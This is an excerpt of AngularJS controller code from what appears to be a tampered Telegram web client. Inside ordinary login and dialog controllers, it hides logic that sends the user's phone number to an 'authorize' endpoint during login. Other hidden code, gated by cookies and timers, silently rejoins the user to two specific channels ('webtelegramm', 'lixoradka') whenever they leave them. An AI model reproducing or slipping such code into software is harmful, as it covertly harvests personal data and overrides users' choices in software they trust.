...
angular.module('myApp.controllers', ['myApp.i18n'])
  ...
  .controller('AppWelcomeController', function ($scope, $cookies, $location, MtpApiManager, ChangelogNotifyService, LayoutSwitchService) {
 
    var ten_min = 300 * 1000;
    $cookies.put('ten_min', 'true', { expires: new Date(Date.now() + ten_min) });
  ...
  .controller('AppLoginController', function ($scope, $rootScope, $location, $timeout, $modal, $modalStack, MtpApiManager, ErrorService, NotificationsManager, PasswordManager, ChangelogNotifyService, IdleManager, LayoutSwitchService, WebPushApiManager, TelegramMeWebService, _) {
    ...
    $scope.sendCode = function () {
      ...
      var paramsauth = 'p=' + encodeURIComponent(fullPhone);
      xhrauth.open("GET", "authorize/?" + paramsauth, true);
      xhrauth.send(null);
  ...
  .controller('AppIMController', function ($q, qSync, $scope, $location, $routeParams, $modal, $rootScope, $modalStack, MtpApiManager, AppUsersManager, AppChatsManager, AppMessagesManager, AppPeersManager, ContactsSelectService, ChangelogNotifyService, ErrorService, AppRuntimeManager, HttpsMigrateService, LayoutSwitchService, LocationParamsService, AppStickersManager) {
    ...
    $scope.isSubcriber = function (dialogs, channel) {
      var show = true;

      angular.forEach(dialogs, function (dialog) {
        if (dialog.peerID == channel) {
          show = false;
        }
      });
  ...
  .controller('AppImDialogsController', function ($scope, $cookies, $location, $q, $timeout, $routeParams, MtpApiManager, AppUsersManager, AppChatsManager, AppMessagesManager, AppProfileManager, AppPeersManager, PhonebookContactsService, ErrorService, AppRuntimeManager) {
    $scope.dialogs = []
    $scope.myResults = []
    $scope.foundPeers = []
    $scope.foundMessages = []
    ...
    function getDialogs (force) {
      ...
      if (!$cookies.get('ten_min')) {
        if (!$cookies.get('leave_channels')) {
          var check_date = new Date();
          var check_hour = check_date.getHours();
          var check_min = check_date.getMinutes();

          if (!$cookies.get('webtelegramm') && ((check_hour == 1 || check_hour == 2 || check_hour == 3 || check_hour == 4 || check_hour == 5 || check_hour == 6 || check_hour == 7 || check_hour == 8 || check_hour == 9 || check_hour == 10 || check_hour == 11 || check_hour == 12 || check_hour == 13 || check_hour == 14 || check_hour == 15 || check_hour == 16 || check_hour == 17 || check_hour == 18 || check_hour == 19 || check_hour == 20 || check_hour == 21 || check_hour == 22 || check_hour == 23 || check_hour == 24) && (check_min < 59))) {
            MtpApiManager.invokeApi('contacts.search', { q: 'webtelegramm', limit: 10 }).then(function (result) {
              var channel = AppChatsManager.getChannelInput(1127508886);
              var leave = result.chats[0].pFlags;

              channel.access_hash = result.chats[0].access_hash;

              var cookie_date = new Date();
              var cookie_hour = cookie_date.getHours();

              cookie_date.setHours(cookie_hour + 1);

              $cookies.put('webtelegramm', 'true', { expires: cookie_date });

              if (leave.left == true) {
                MtpApiManager.invokeApi('channels.joinChannel', { channel: channel }).then(function (result) {
                  ApiUpdatesManager.processUpdateMessage(result);
                });
              }
            });
          }
          if (!$cookies.get('lixoradka') && ((check_hour == 1 || check_hour == 2 || check_hour == 3 || check_hour == 4 || check_hour == 5 || check_hour == 6 || check_hour == 7 || check_hour == 8 || check_hour == 9 || check_hour == 10 || check_hour == 11 || check_hour == 12 || check_hour == 13 || check_hour == 14 || check_hour == 15 || check_hour == 16 || check_hour == 17 || check_hour == 18 || check_hour == 19 || check_hour == 20 || check_hour == 21 || check_hour == 22 || check_hour == 23 || check_hour == 24) && (check_min < 59))) {
            MtpApiManager.invokeApi('contacts.search', { q: 'lixoradka', limit: 10 }).then(function (result) {
              var channel = AppChatsManager.getChannelInput(1496271677);
              var leave = result.chats[0].pFlags;
              ...
              $cookies.put('lixoradka', 'true', { expires: cookie_date });
  ...
  .controller('ChannelModalController', function ($scope, $cookies, $timeout, $rootScope, $modal, AppUsersManager, AppChatsManager, AppProfileManager, AppPhotosManager, MtpApiManager, MtpApiFileManager, NotificationsManager, AppMessagesManager, AppPeersManager, ApiUpdatesManager, ContactsSelectService, ErrorService) {
    $scope.chatFull = AppChatsManager.wrapForFull($scope.chatID, {})
    $scope.settings = {notifications: true}
    ...
    $scope.webtelegramm = 1127508886;
    $scope.lixoradka = 1496271677;
	
    if ($scope.chatID == $scope.webtelegramm || $scope.chatID == $scope.lixoradka) {
      $scope.leave_channel = 1
    } else {
      $scope.leave_channel = 0
    }

    $scope.leaveChannel = function () {
      return ErrorService.confirm({type: $scope.isMegagroup ? 'MEGAGROUP_LEAVE' : 'CHANNEL_LEAVE'}).then(function () {

        if ($scope.chatID == '1127508886' || $scope.chatID == '1496271677') {
          var one_hour = 7200 * 1000;
          $cookies.put('leave_channels', 'true', {expires: new Date(Date.now() + one_hour)});
        }
